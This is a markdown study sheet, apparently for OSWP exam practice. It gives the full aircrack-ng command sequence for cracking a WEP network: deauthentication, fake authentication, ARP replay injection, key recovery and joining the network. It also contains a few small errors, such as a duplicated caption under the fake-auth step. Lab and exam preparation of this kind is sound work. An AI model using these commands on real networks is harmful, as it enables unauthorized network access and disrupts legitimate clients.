
# 🛡️ WEP Attack – SSH-only, exam-style flow

## ⚙️ 0. Initial Setup

📌 Get your interface MAC (before monitor mode) via:

```bash
cat /sys/class/net/wlan0/address
```
or
```bash
ip link show wlan0
```

then let's go!

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Enables monitor mode on `wlan0mon`.

---

## 🔍 1. Network Scanning

```bash
sudo airodump-ng wlan0mon
```

Identify:
- `BSSID`
- `Channel`
- `Associated Clients` (STATION)

---

## 🎯 2. Targeted Sniffing

```bash
sudo airodump-ng --bssid <BSSID> -c <CH> -w dump wlan0mon
```

Collects IVs for cracking.

---

## 🔐 2. At the same time: Fake Auth (mandatory before injection)

```bash
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
```

Collects IVs for cracking.

---

## 💣 3. (Optional) Deauth Attack

```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

Forces a client to reconnect and trigger ARP traffic.

---

## 🚀 4. At the same time: ARP Replay Attack


```bash
sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
```

Injects ARP requests to increase `#Data`.
`-h` needs **your** MAC not a random one. We are pretending to be a legitimate client.

---

## 🔓 5. At the same time: Crack the WEP Key

When you see 20.000–30.000 IV in the `#Data` column you need to:


```bash
aircrack-ng dump-01.cap
```

Expected result:

```
KEY FOUND! [ 12:34:56:78:90 ]
```
---

## 🔌 6. Connect Using wpa_supplicant

### wep.conf

```ini
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0="1234567890"
    wep_tx_keyidx=0
}
```

### Launch

```bash
sudo airmon-ng stop wlan0mon
sudo wpa_supplicant -i wlan0 -c wep.conf -D nl80211
sudo dhclient wlan0
```

---

## ✅ 7. Verify Connection

```bash
ip a
ping 192.168.1.1
```

---

## 🧠 Extra: 
### IP vs Gateway Explanation

- **192.168.1.48** is your local IP, assigned via DHCP by the router.
- **192.168.1.1** is usually the **gateway/router**, your exit to the rest of the network or internet.
- Pinging `192.168.1.1` checks if you're actually connected to the router.
- Pinging `192.168.1.48` means you're pinging yourself — useful only for internal stack checks.

### Fake auth differences

❓ Are these two commands the same?

```bash
sudo aireplay-ng --fakeauth 0 -a <BSSID> -h <YOUR_MAC> wlan0mon
```

vs

```bash
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
```

No! they are not! they are similar but not the same. And here is why: 
📌 Command 1 – One-Time Fake Auth

```bash
sudo aireplay-ng --fakeauth 0 -a <BSSID> -h <YOUR_MAC> wlan0mon
```

- Performs a **single fake authentication attempt** with 0ms timeout.
- Registers your MAC with the target AP so it accepts injected packets.
- Output when successful:

  ```
  Authentication successful
  ```

✅ Use this for **quick testing** or **simple APs**.  
🚫 If the AP drops your session (timeout, range issues), injection will fail.

---

## 📌 Command 2 – Persistent Re-Auth

```bash
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
```

- `-1 3600`: re-authenticate every **3600 seconds** (1 hour).
- `-q 10`: show status every **10 seconds**.
- More stable for long-running injection or strict APs.

✅ Recommended for **OSWP labs**, **unstable links**, or **demanding routers**.

---

## 🧠 TL;DR Summary

| Command | Type | When to Use |
|--------|------|-------------|
| `--fakeauth 0` | Single shot | Quick tests, permissive routers |
| `-1 3600 -q 10` | Persistent | Long sessions, lab setup, unstable auth |

---

## 💡 Pro Tip

- Use **persistent fake auth** before launching `--arpreplay`.
- If fakeauth fails:
  - Try a different MAC with `macchanger`
  - Move closer to the AP
  - Add delay: `--fakeauth 60000`

---

Chapter closed. WEP is toast. Ready for WPA2? 😎
